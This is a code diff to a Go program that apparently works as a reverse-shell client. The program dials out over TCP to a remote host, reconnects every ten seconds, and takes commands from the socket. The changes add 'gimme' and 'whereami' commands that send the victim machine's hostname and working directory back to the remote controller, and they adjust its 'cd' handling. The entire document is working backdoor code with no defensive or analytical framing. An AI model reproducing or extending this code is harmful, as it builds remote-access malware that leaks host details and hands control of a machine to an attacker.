@@ -6,6 +6,7 @@ import (
 	"os"
 	"os/exec"
 	"strings"
+	"time"
 )
 
 // const (
@@ -64,6 +65,7 @@ func main() {
 			conn, err = net.DialTCP("tcp", nil, tcpAddr)
 			if err != nil {
 				println("Dial failed:", err.Error())
+				time.Sleep(10 * time.Second)
 				connected = false
 				// os.Exit(1)
 			}
@@ -76,6 +78,7 @@ func main() {
 			_, err := conn.Read(buf)
 			if err != nil {
 				fmt.Println("Error reading:", err.Error())
+				break
 			}
 			bufString := ""
 			for _, v := range buf {
@@ -83,9 +86,21 @@ func main() {
 					bufString = bufString + string(v)
 				}
 			}
-			if buf[0] == 'c' && buf[1] == 'd' {
+			if bufString == "gimme" {
+				name, err := os.Hostname()
+				if err != nil {
+					fmt.Printf("Oops: %v\n", err)
+				}
+				conn.Write([]byte(name))
+			} else if bufString == "whereami" {
+				directory, err := os.Getwd()
+				if err != nil {
+					fmt.Printf("Oops: %v\n", err)
+				}
+				conn.Write([]byte(directory))
+			} else if buf[0] == 'c' && buf[1] == 'd' {
 				splits := strings.Split(bufString, " ")
-				if len(splits) < 1 {
+				if len(splits) <= 1 {
 					conn.Write([]byte("cd no worky"))
 					break
 				}
